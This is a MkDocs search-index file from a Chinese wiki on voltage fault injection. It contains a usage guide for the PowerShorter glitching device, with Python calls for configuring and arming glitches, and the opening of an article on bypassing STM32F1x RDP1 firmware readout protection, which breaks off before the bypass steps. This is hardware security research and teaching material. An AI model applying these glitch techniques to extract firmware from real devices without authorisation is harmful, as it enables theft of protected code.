{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"Home","text":""},{"location":"#wiki","title":"\u6b22\u8fce\u6765\u5230\u6545\u969c\u6ce8\u5165wiki\uff08\u4e34\u65f6\uff09","text":"<p>\u6587\u6863\u5217\u8868\uff1a</p> <p>PowerShorter \u5f00\u7bb1\u4e0e\u7b80\u5355\u4f7f\u7528</p> <p>nRF52 \u7535\u538b\u6545\u969c\u6ce8\u5165\u7ed5\u8fc7 APPROTECT \u56fa\u4ef6\u8bfb\u4fdd\u62a4</p> <p>STM32F1x \u7535\u538b\u6545\u969c\u6ce8\u5165\u7ed5\u8fc7 RDP1 \u56fa\u4ef6\u8bfb\u4fdd\u62a4</p>"},{"location":"%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/PowerShorter%E5%BC%80%E7%AE%B1%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/","title":"PowerShorter\u5f00\u7bb1\u4e0e\u7b80\u5355\u4f7f\u7528","text":"<p>\u8bbe\u5907\u5df2\u4e0a\u67b6\u6dd8\u5b9d\uff0c\u641c\u7d22 PowerShorter\uff0c\u5728\u7ebd\u521b\u4fe1\u5b89\u5e97\u94fa\u8d2d\u4e70\u5373\u53ef</p> <p>PowerShorter \u662f\u4e3a\u7535\u538b\u77ed\u8def\u6545\u969c\u6ce8\u5165\u653b\u51fb\u6d4b\u8bd5\u5b9a\u5236\u7684\u4e00\u6b3e\u4e13\u7528\u8bbe\u5907\u3002\u901a\u8fc7 PowerShorter \u53ef\u5b9e\u73b0\u88ab\u6d4b\u8bbe\u5907\u7684\u77ac\u65f6\u77ed\u8def\uff0c\u5e72\u6270\u8bbe\u5907\u6b63\u5e38\u8fd0\u884c</p> <p>\u8bbe\u5907\u5177\u6709\u4e24\u8def\u77ed\u8def\u5f15\u64ce\uff0c\u53ef\u4ee5\u540c\u65f6\u62c9\u4e24\u4e2a\u4f4d\u7f6e\u7684\u77ed\u8def\u6bdb\u523a\uff0c\u540c\u65f6\u914d\u6709\u4e24\u8defGPIO\uff0c\u4e00\u8def\u56fa\u6001\u7ee7\u7535\u5668\uff0c\u4e00\u8def\u7535\u78c1\u7ee7\u7535\u5668</p> <p></p>"},{"location":"%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/PowerShorter%E5%BC%80%E7%AE%B1%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/#_1","title":"\u5f00\u7bb1","text":"<p>\u8d34\u4e24\u5f20\u8bbe\u5907\u5b9e\u7269\u56fe\uff0c\u6536\u7eb3\u5305\u4e2d\u6709\u4e00\u4e2a PowerShorter \u672c\u4f53\uff0c\u4e00\u6392\u675c\u90a6\u7ebf\u53ca\u4e00\u6839 Type-C \u6570\u636e\u7ebf</p> <p></p> <p></p> <p>\u4e00\u4fa7\u662f Type-C \u63a5\u53e3\u53ca\u675c\u90a6\u7ebf\u6392\u9488\uff0c\u8fd9\u4e00\u4fa7\u4e3b\u8981\u8d1f\u8d23\u63a7\u5236 GPIO \u8f93\u51fa\u53ca\u89e6\u53d1\u5f15\u811a</p> <p>\u5176\u4e2d E1-Tri \u548c E2-Tri \u5206\u522b\u5bf9\u5e94\u4e86\u77ed\u8def\u5f15\u64ce E1 \u548c E2 \u7684\u89e6\u53d1\u5f15\u811a\uff1bIO1 \u548c IO2 \u5373\u4e3a GPIO \u8f93\u51fa\uff0c\u53ef\u7528\u6765\u4f5c\u4e3a\u89e6\u53d1\u6216\u4f9b\u7535 </p> <p></p> <p>\u53e6\u4e00\u4fa7\u4e2d\u7684 Relay1 \u662f\u56fa\u6001\u7ee7\u7535\u5668\uff0cRelay2 \u662f\u7535\u78c1\u7ee7\u7535\u5668\uff0c\u53ef\u4ee5\u7528\u6765\u63a7\u5236\u76ee\u6807\u8bbe\u5907\u7684\u91cd\u542f\u590d\u4f4d\u7b49\u903b\u8f91\uff1bE1 \u548c E2 \u662f\u77ed\u8def\u5f15\u64ce\u505a\u77ed\u8def\u7684\u4f4d\u7f6e\uff0c\u5728\u5b9e\u9645\u64cd\u4f5c\u4e2d\u9700\u8981\u628a\u76ee\u6807\u8bbe\u5907\u7684\u6838\u5fc3\u4f9b\u7535\u5f15\u811a\u63a5\u5230 + \u6807\u8bb0\u7684\u4f4d\u7f6e\uff0c\u76ee\u6807\u8bbe\u5907\u7684 GND \u63a5\u5230 - \u6807\u8bb0\u7684\u4f4d\u7f6e\uff08\u5f53\u7136 - \u8fd9\u4e2a\u4f4d\u7f6e\u548c PowerShorter \u7684 GND \u662f\u76f8\u8fde\u7684\uff0c\u56e0\u6b64\u76ee\u6807\u8bbe\u5907 GND \u5f15\u811a\u4e0e PowerShorter GND \u8fde\u63a5\u540e\u4e5f\u53ef\u4ee5\u4e0d\u63a5\u8fd9\u4e2a\u4f4d\u7f6e\uff09\uff1bSMA-E1 \u548c SMA-E2 \u662f\u7528\u6765\u89c2\u5bdf\u77ed\u63a5\u6bdb\u523a\u4f7f\u7528\u7684</p> <p></p> <p>\u5176\u4e2d\u7684\u63d2\u7ebf\u7aef\u5b50\u53ef\u4ee5\u53d6\u4e0b\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u76f4\u63a5\u63d2\u675c\u90a6\u7ebf\u4e86\uff0c\u7701\u4e86\u4e00\u4e2a\u87ba\u4e1d\u5200\uff0c\u4f46\u9047\u5230\u8d28\u91cf\u4e0d\u597d\u7684\u675c\u90a6\u7ebf\u5c31\u4e0d\u5982\u63d2\u7ebf\u7aef\u5b50\u7a33\u5b9a\u4e86\uff0c\u5927\u5bb6\u770b\u60c5\u51b5\u9009\u62e9\u5427</p> <p></p>"},{"location":"%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/PowerShorter%E5%BC%80%E7%AE%B1%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/#python","title":"Python \u5e93","text":"<p>\u8bbe\u5907\u4f7f\u7528 Python \u8fdb\u884c\u63a7\u5236\uff0c\u63a7\u5236\u811a\u672c\u5728 gitee \u5f00\u6e90\u4e86\uff0c\u5730\u5740\u5982\u4e0b\uff1a</p> <p>\u6df1\u5733\u5e02\u7ebd\u521b\u4fe1\u5b89\u79d1\u6280\u5f00\u53d1\u6709\u9650\u516c\u53f8/powershorter</p> <p>\u70b9\u51fb\u6b64\u5904\u7684\u53d1\u884c\u7248\u5c31\u53ef\u4ee5\u4e0b\u8f7d .whl \u6587\u4ef6\uff0c\u4f7f\u7528 pip \u8fdb\u884c\u5b89\u88c5</p> <p></p> <p></p>"},{"location":"%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/PowerShorter%E5%BC%80%E7%AE%B1%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/#_2","title":"\u7b80\u5355\u4f7f\u7528","text":"<p>\u5bf9\u4e8e\u6253\u6545\u969c\u6765\u8bf4\uff0c\u6211\u66f4\u4e60\u60ef\u4e8e\u4f7f\u7528 jupyter lab \u8fd9\u4e2a\u4ea4\u4e92\u5f0f\u7684\u8fd0\u884c\u73af\u5883\uff0c\u6240\u4ee5\u6211\u8fd8\u8981\u88c5\u4e00\u4e0b jupyter</p> <pre><code>pip install jupyter\n</code></pre> <p>\u5b89\u88c5\u5b8c\u6210\u540e\u5c31\u53ef\u4ee5\u5728\u7ec8\u7aef\u4e2d\u8f93\u5165<code>jupyter lab</code>\u8fd9\u6761\u547d\u4ee4\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\u4f1a\u81ea\u52a8\u6253\u5f00\u6d4f\u89c8\u5668\u7a97\u53e3\uff0c\u5982\u679c\u4f60\u7535\u8111\u505a\u4e86\u4ec0\u4e48\u8bbe\u7f6e\u65e0\u6cd5\u6253\u5f00\u7684\u8bdd\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u624b\u52a8\u8bbf\u95ee URL</p> <p></p> <p>\u70b9\u51fb\u65b0\u5efa\u4e00\u4e2a Notebook</p> <p></p>"},{"location":"%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/PowerShorter%E5%BC%80%E7%AE%B1%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/#_3","title":"\u5bfc\u5165\u8bbe\u5907\u5e93","text":"<p>\u7136\u540e\u5c31\u53ef\u4ee5\u6267\u884c Python \u4ee3\u7801\u4e86\uff0c\u9996\u5148\u5bfc\u5165\u63a7\u5236\u4ee3\u7801\u5e93\uff1a<code>from power_shorter import *</code></p> <p>\u7136\u540e\u9700\u8981\u521d\u59cb\u5316\u8bbe\u5907\uff0c\u56e0\u4e3a\u63a7\u5236\u811a\u672c\u662f\u901a\u8fc7\u4e32\u53e3\u4e0e PowerShorter \u8fdb\u884c\u901a\u4fe1\u7684\uff0c\u56e0\u6b64\u521d\u59cb\u5316\u65f6\u9700\u8981\u6307\u5b9a\u4e32\u53e3\u53f7\uff0c\u53ef\u4ee5\u5728\u8bbe\u5907\u7ba1\u7406\u5668\u4e2d\u627e\u5230\u4e00\u4e2a CH340 \u7684\u4e32\u53e3\u8bbe\u5907\uff08\u82e5\u8bc6\u522b\u4e0d\u5230\u9700\u8981\u5b89\u88c5 CH340 \u4e32\u53e3\u9a71\u52a8\uff1ahttps://www.wch.cn/products/CH340.html\uff09</p> <p></p>"},{"location":"%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/PowerShorter%E5%BC%80%E7%AE%B1%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/#_4","title":"\u521d\u59cb\u5316\u8bbe\u5907","text":"<p>\u5728 jupyter \u7f51\u9875\u73af\u5883\u4e2d\u70b9\u51fb\u83dc\u5355\u680f\u7684\u5f00\u59cb\u6309\u94ae\u5c31\u53ef\u4ee5\u4e00\u6761\u4e00\u6761\u7684\u6267\u884c\u4ee3\u7801\uff0c\u4ee3\u7801\u524d\u9762\u7684\u4e2d\u62ec\u53f7\u5982\u679c\u662f\u661f\u53f7 [ * ] \u8868\u793a\u6b63\u5728\u6267\u884c\uff0c\u5982\u679c\u662f\u6570\u5b57\u8868\u793a\u5df2\u7ecf\u6267\u884c\u8fc7\u4e86\uff0c\u5982\u679c\u662f\u7a7a\u7684\u8868\u793a\u6ca1\u6709\u6267\u884c</p> <p></p> <p>\u53ef\u4ee5\u901a\u8fc7 tab \u952e\u67e5\u770b\u63d0\u793a</p> <p> </p> <p>\u5728\u51fd\u6570\u4e0a\u6309 shift+tab \u952e\u67e5\u770b\u51fd\u6570\u6ce8\u91ca</p> <p></p>"},{"location":"%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/PowerShorter%E5%BC%80%E7%AE%B1%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/#_5","title":"\u63a7\u5236\u7ee7\u7535\u5668","text":"<p>\u8bbe\u5907\u7ecf\u8fc7\u521d\u59cb\u5316\u540e\u5c31\u53ef\u4ee5\u505a\u5404\u79cd\u64cd\u4f5c\u5566\uff0c  \u5982\u679c\u60f3\u8981\u63a7\u5236\u7535\u78c1\u7ee7\u7535\u5668\u7684\u8bdd\u53ef\u4ee5\u4f7f\u7528 RELAY2\uff0c\u6267\u884c\u8fd9\u4e24\u6761\u8bed\u53e5\u540e\u4f1a\u542c\u5230\u556a\u55d2\u556a\u55d2\u7684\u58f0\u97f3\uff0c\u8fd9\u5c31\u662f\u7535\u78c1\u7ee7\u7535\u5668\u5438\u5408\u7684\u54cd\u52a8</p> <pre><code>ps.relay(RELAY.RELAY2, 1)  # \u7535\u78c1\u7ee7\u7535\u5668\u63a5\u901a\nps.relay(RELAY.RELAY2, 0)  # \u7535\u78c1\u7ee7\u7535\u5668\u65ad\u5f00\n</code></pre> <p></p> <p>\u63a7\u5236\u56fa\u6001\u7ee7\u7535\u5668\u901a\u65ad\u53ea\u9700\u8981\u4fee\u6539\u4e3a RELAY1 \u5373\u53ef\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u56fa\u6001\u7ee7\u7535\u5668\u662f\u901a\u8fc7\u7535\u8def\u5b9e\u73b0\u7684\u901a\u65ad\u63a7\u5236\uff0c\u5e76\u4e0d\u662f\u7269\u7406\u4e0a\u7684\u901a\u65ad\uff0c\u56e0\u6b64\u9700\u8981\u989d\u5916\u5c06 PowerShorter \u7684 GND \u5f15\u811a\u63a5\u5230\u76ee\u6807 GND \u4e0a\uff01</p> <pre><code>ps.relay(RELAY.RELAY1, 1)  # \u56fa\u6001\u7ee7\u7535\u5668\u63a5\u901a\nps.relay(RELAY.RELAY1, 0)  # \u56fa\u6001\u7ee7\u7535\u5668\u65ad\u5f00\n</code></pre> <p></p>"},{"location":"%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/PowerShorter%E5%BC%80%E7%AE%B1%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/#gpio","title":"\u63a7\u5236GPIO","text":"<p>\u540c\u7406\uff0c\u63a7\u5236 GPIO \u7684\u65b9\u5f0f\u662f\uff1a</p> <pre><code>ps.gpio(GPIO.GPIO1, 1)  # GPIO1\u62c9\u9ad8\nps.gpio(GPIO.GPIO1, 0)  # GPIO1\u62c9\u4f4e\nps.gpio(GPIO.GPIO2, 1)  # GPIO2\u62c9\u9ad8\nps.gpio(GPIO.GPIO2, 0)  # GPIO2\u62c9\u4f4e\n</code></pre> <p></p>"},{"location":"%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/PowerShorter%E5%BC%80%E7%AE%B1%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/#_6","title":"\u914d\u7f6e\u77ed\u8def\u5f15\u64ce","text":"<p>\u63a5\u4e0b\u6765\u4ecb\u7ecd\u4e00\u4e0b\u6545\u969c\u6ce8\u5165\u6700\u91cd\u8981\u7684\u53c2\u6570\u63a7\u5236\uff0c\u5ef6\u65f6\u548c\u6bdb\u523a\u5bbd\u5ea6\u7684\u914d\u7f6e\uff0c\u5728 PowerShorter \u4e2d\uff0c\u4f7f\u7528 engine_cfg \u6765\u8fdb\u884c\u914d\u7f6e</p> <pre><code>ps.engine_cfg(Engine.E1, [(0, 3000), (1, 200), (0, 1)], TRIGGER_MODE.RISE, 1, 1)\n</code></pre> <p></p> <p>\u89e3\u91ca\u4e00\u4e0b\u5404\u4e2a\u53c2\u6570\uff0c\u9996\u5148\u9700\u8981\u6307\u5b9a\u914d\u7f6e\u7684\u77ed\u8def\u5f15\u64ce\uff0c\u8fd9\u91cc\u914d\u7f6e\u4e3a E1</p> <p>\u7136\u540e\u901a\u8fc7\u4e00\u4e2a\u53c2\u6570\u5217\u8868\u6765\u914d\u7f6e\u6bdb\u523a\u7684\u5ef6\u65f6\u548c\u5bbd\u5ea6\uff0c\u5217\u8868\u91cc\u9762\u5143\u7ec4\u7684\u7b2c\u4e00\u4e2a\u503c 0 \u8868\u793a\u65ad\u5f00\u30011 \u8868\u793a\u77ed\u63a5\uff1b\u7b2c\u4e8c\u4e2a\u503c\u8868\u793a\u4fdd\u6301\u65f6\u95f4\uff0c\u5355\u4f4d\u662f 10ns</p> <p>\u4f8b\u5982\u8fd9\u91cc\u7684 [(0, 3000), (1, 200), (0, 1)] \u5c31\u8868\u793a\u6536\u5230\u89e6\u53d1\u4fe1\u53f7\u540e\uff0c\u4fdd\u6301\u65ad\u5f00\u72b6\u6001 3000 * 10ns\uff0c\u7136\u540e\u77ed\u63a5 200 * 10ns\uff0c\u6700\u540e\u4fdd\u6301\u65ad\u5f00 1 * 10ns\uff0c\u5982\u679c\u540e\u7eed\u4e0d\u518d\u64cd\u4f5c\u5c06\u4e00\u76f4\u4fdd\u6301\u65ad\u5f00\u72b6\u6001\u3002\u8fd9\u80cc\u540e\u5b9e\u9645\u662f\u63a7\u5236 MOS \u7ba1\u5bf9 E1 \u7684 + \u548c - \u8fdb\u884c\u65ad\u5f00\u6216\u77ed\u63a5\uff0c\u4ece\u800c\u5b9e\u73b0\u7535\u538b\u77ed\u8def\u6545\u969c\u6ce8\u5165</p> <p>\u540e\u9762\u4e09\u4e2a\u53c2\u6570\u5206\u522b\u662f\uff1a</p> <p>\u914d\u7f6e\u89e6\u53d1\u8fb9\u6cbf\u662f\u4e0a\u5347\u6cbf\u8fd8\u662f\u4e0b\u964d\u6cbf\uff08\u9ed8\u8ba4\u4e3a\u4e0a\u5347\u6cbf\u89e6\u53d1\uff0c\u53ef\u4ee5\u4e0d\u586b\u5199\uff09</p> <p>\u6bdb\u523a\u53c2\u6570\u7684\u91cd\u590d\u6b21\u6570\uff0c\u53ef\u4ee5\u91cd\u590d\u6267\u884c\u53c2\u6570\u5217\u8868\u4e2d\u914d\u7f6e\u7684\u6bdb\u523a\uff08\u9ed8\u8ba4\u914d\u7f6e\u4e3a 1\uff0c\u53ef\u4ee5\u4e0d\u586b\u5199\uff09</p> <p>\u6bdb\u523a\u8fb9\u6cbf\u68c0\u6d4b\u6b21\u6570\uff0c\u53ef\u4ee5\u914d\u7f6e\u68c0\u6d4b\u5230\u591a\u6b21\u8fb9\u6cbf\u518d\u89e6\u53d1\u6bdb\u523a\uff08\u9ed8\u8ba4\u914d\u7f6e\u4e3a 1\uff0c\u53ef\u4ee5\u4e0d\u586b\u5199\uff09</p> <p>\u90a3\u518d\u56de\u5934\u770b\u6211\u4eec\u914d\u7f6e\u7684\u53c2\u6570\uff0c\u6574\u4f53\u7684\u542b\u4e49\u662f\uff1a\u914d\u7f6e\u77ed\u8def\u5f15\u64ce E1 \u7684\u89e6\u53d1\u5f15\u811a\uff08E1-Tri\uff09\u68c0\u6d4b\u5230\u4e0a\u5347\u6cbf\u540e\u5148\u7b49 3000 * 10ns\uff0c\u518d\u62c9\u4e00\u4e2a 200 * 10ns \u7684\u77ed\u8def\u6bdb\u523a\uff0c\u7136\u540e\u4fdd\u6301\u65ad\u5f00</p> <p>\u914d\u7f6e\u5b8c\u6bdb\u523a\u7684\u53c2\u6570\u540e\u9700\u8981\u4f7f\u7528 arm \u51fd\u6570\u6fc0\u6d3b\u6bdb\u523a\uff0c\u53ef\u4ee5\u4f7f\u7528 state \u51fd\u6570\u67e5\u770b\u5f53\u524d\u72b6\u6001\uff0carmed \u8868\u793a\u6bdb\u523a\u5df2\u7ecf\u88ab\u6fc0\u6d3b\u4e86\uff0c\u6b63\u5728\u7b49\u5f85\u89e6\u53d1\uff0c\u540c\u65f6\u8bbe\u5907\u7ea2\u8272\u7684 LED \u706f\u4f1a\u7184\u706d</p> <pre><code>ps.arm(Engine.E1)\nps.state(Engine.E1)\n</code></pre> <p></p> <p>\u6b64\u65f6\u5982\u679c\u7528\u675c\u90a6\u7ebf\u5c06\u8bbe\u5907\u7684 GPIO1 \u548c E1-Tri \u8fde\u63a5\uff0c\u7136\u540e\u5c06 GPIO1 \u62c9\u9ad8\u63d0\u4f9b\u4e00\u4e2a\u4e0a\u5347\u6cbf\u5c06\u6bdb\u523a\u89e6\u53d1\uff0c\u518d\u770b\u6bdb\u523a\u7684\u72b6\u6001\u5c31\u5df2\u7ecf\u662f glitched \u8868\u793a\u5df2\u7ecf\u6bdb\u523a\u5df2\u7ecf\u6253\u51fa\u53bb\u4e86\uff0cE1 \u7684 + \u548c - \u505a\u4e86\u4e00\u6b21 200 * 10ns \u7684\u77ed\u8def\uff0c\u7ea2\u706f\u4e5f\u53c8\u4eae\u4e86\u8d77\u6765</p> <p></p>"},{"location":"%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/PowerShorter%E5%BC%80%E7%AE%B1%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/#_7","title":"\u7edf\u8ba1\u6545\u969c\u53c2\u6570","text":"<p>\u5bf9\u4e8e\u6545\u969c\u6ce8\u5165\u6765\u8bf4\uff0c\u7edf\u8ba1\u6545\u969c\u53c2\u6570\u53ca\u7ed3\u679c\u662f\u5f88\u6709\u5fc5\u8981\u7684\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u6709\u53c2\u8003\u7684\u8c03\u6574\u53c2\u6570\uff0c\u7edf\u8ba1\u7ed3\u679c\u53ef\u4ee5\u4f7f\u7528 FaultViz \u8fd9\u4e2a\u5e93</p> <p>\u6df1\u5733\u5e02\u7ebd\u521b\u4fe1\u5b89\u79d1\u6280\u5f00\u53d1\u6709\u9650\u516c\u53f8/FaultViz</p> <p>\u8fd9\u4e2a\u5e93\u7684\u4f7f\u7528\u9700\u8981\u914d\u7f6e JAVA \u73af\u5883\uff0c\u5177\u4f53\u914d\u7f6e\u7f51\u4e0a\u641c\u5427\u4e0d\u7ec6\u8bf4\u4e86\uff0c\u5b89\u88c5\u5b8c\u6210\u540e\u76f4\u63a5\u5bfc\u5165\u5e93\uff0c\u542f\u7528\u670d\u52a1\u65f6\u9700\u8981\u6307\u5b9a\u7aef\u53e3\uff08\u9ed8\u8ba4\u4e3a 12345\uff0c\u53ef\u4ee5\u4e0d\u586b\u5199\uff09</p> <pre><code>faultviz.start_view_service(port=12345)\n</code></pre> <p>\u7136\u540e\u901a\u8fc7 faultviz.ViewWidget() \u521b\u5efa\u4e00\u5f20\u8868</p> <p></p> <p>vt.update() \u5f80\u8868\u91cc\u6dfb\u52a0\u6570\u636e\uff0c\u8fd9\u91cc\u9762\u7684\u6570\u636e\u5b8c\u5168\u662f\u7531\u4f60\u81ea\u5df1\u5b9a\u4e49\u7684\uff0c\u952e\u503c\u5bf9\u7684\u5f62\u5f0f\uff0c\u952e\u4f1a\u4f5c\u4e3a\u5217\u540d\uff0c\u503c\u4f1a\u653e\u5728\u8868\u4e2d\u4f5c\u4e3a\u6570\u636e\uff0c\u6267\u884c\u8fc7\u7b2c\u4e00\u6b21 update() \u51fd\u6570\u540e\u8868\u4e2d\u624d\u6709\u4e86\u5b9e\u9645\u6570\u636e\uff0c\u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5\u4f7f\u7528 vt.show() \u67e5\u770b\u8bb0\u5f55\u4e86\uff0c\u53ef\u4ee5\u5bf9\u6570\u636e\u8fdb\u884c\u7b5b\u9009\u3001\u6392\u5e8f\u3001\u5bfc\u51fa\u7b49\u64cd\u4f5c</p> <p></p>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/","title":"STM32F1x \u7535\u538b\u6545\u969c\u6ce8\u5165\u7ed5\u8fc7 RDP1 \u56fa\u4ef6\u8bfb\u4fdd\u62a4","text":""},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_1","title":"\u76f8\u5173\u5de5\u5177\u53ca\u73af\u5883","text":""},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_2","title":"\u63a8\u8350\u786c\u4ef6\u8bbe\u5907\u6e05\u5355","text":"<ul> <li>STM32F103 \u6838\u5fc3\u677f\uff08Blue Pill\uff09</li> <li>STLink</li> <li>Pico \u793a\u6ce2\u5668</li> <li>PowerShorter \u7535\u538b\u77ed\u8def\u6545\u969c\u6ce8\u5165\u8bbe\u5907</li> <li>USB \u8f6c TTL \u5c0f\u677f</li> <li>\u675c\u90a6\u7ebf\u82e5\u5e72</li> </ul>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#_3","title":"\u8f6f\u4ef6\u6e05\u5355","text":"<ul> <li>Pico \u793a\u6ce2\u5668\u8f6f\u4ef6</li> <li>STM32CubeProgrammer</li> </ul>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#rdp","title":"RDP \u4ecb\u7ecd\u4e0e\u5f00\u542f","text":"<p>\u4e3a\u4e86\u4fdd\u62a4\u82af\u7247\u5185\u7684\u56fa\u4ef6\u4e0d\u88ab\u653b\u51fb\u8005\u83b7\u53d6\uff0cST \u7ed9\u82af\u7247\u8bbe\u8ba1\u4e86\u56fa\u4ef6\u8bfb\u4fdd\u62a4\u673a\u5236\uff08Readout Protection\uff09\u7b80\u79f0 RDP</p>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#rdp_1","title":"RDP \u7ea7\u522b\u5b9a\u4e49","text":"<ul> <li>Level 0\uff1a\u65e0\u4efb\u4f55\u4fdd\u62a4\uff0c\u9ed8\u8ba4\u7684 RDP \u7ea7\u522b\uff0c\u4ec5\u9002\u7528\u4e8e\u5f00\u53d1\u548c\u8c03\u8bd5  </li> <li>Level 1\uff1a\u7981\u7528\u90e8\u5206\u8c03\u8bd5\u529f\u80fd\uff0c\u65e0\u6cd5\u901a\u8fc7\u8c03\u8bd5\u63a5\u53e3\u8bbf\u95ee Flash\uff0c\u4f46\u53ef\u4ee5\u8bfb\u53d6 SRAM  </li> <li>Level 2\uff1a\u5b8c\u5168\u7981\u7528\u8c03\u8bd5\uff0c\u7981\u6b62\u8bfb\u5199\u4efb\u4f55\u8d44\u6e90\uff0c\u5927\u90e8\u5206\u578b\u53f7\u65e0\u6cd5\u56de\u9000</li> <li>Level 0.5\uff1a\u9002\u7528\u4e8e\u542f\u7528 TrustZone \u7684 STM32 MCU\uff0c\u4ec5\u9650\u5236\u5bf9\u5b89\u5168\u4e16\u754c\u7684\u8c03\u8bd5\u8bbf\u95ee\uff0c\u5141\u8bb8\u8bbf\u95ee\u975e\u5b89\u5168\u4e16\u754c</li> </ul>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#rdp_2","title":"RDP \u5f00\u542f\u4e0e\u5173\u95ed","text":"STM32 ST-Link 3V3 3.3V GND GND SWCLK SWCLK SWO SWDIO <p>\u4f7f\u7528 ST-Link \u8fde\u63a5 STM32 \u7684 SWD \u63a5\u53e3</p> <p></p> <p>\u6253\u5f00 STM32CubeProgrammer \u8fde\u63a5\u6210\u529f\u540e\u70b9\u51fb\u5de6\u4fa7\u3010OB\u3011\u9009\u9879\u8fdb\u5165\u9009\u9879\u5b57\u8282\uff08Option Bytes\uff09\u914d\u7f6e\u9875\u9762\uff0c\u52fe\u9009 RDP \u4fdd\u62a4\uff0c\u70b9\u51fb Apply \u5e94\u7528\u5373\u53ef\u5f00\u542f RDP</p> <p></p> <p>\u5173\u95ed RDP1 \u4e0e\u5f00\u542f\u8def\u5f84\u76f8\u540c\uff0c\u5728 Option bytes \u9009\u9879\u5b57\u8282\u4e2d\u5c06 RDP \u53d6\u6d88\u52fe\u9009\u5e76\u5e94\u7528\uff0c\u5c06 RDP \u5173\u95ed\uff0c\u6b64\u540e\u53ef\u4ee5\u8bfb\u53d6 Flash \u4e2d\u7684\u5185\u5bb9\uff0c\u4f46 Flash \u88ab\u6e05\u7a7a</p> <p></p>"},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#stm32-uart-bootloader","title":"STM32 Uart Bootloader \u4ecb\u7ecd\u4e0e\u4f7f\u7528","text":""},{"location":"%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/#uart-botloader","title":"Uart Botloader \u4ecb\u7ecd\u4e0e\u8fde\u63a5","text":"<p>\u6839\u636e STM32F1XXX \u53c2\u8003\u624b\u518c(P60)\uff0cSTM32F103 \u6839\u636e BOOT 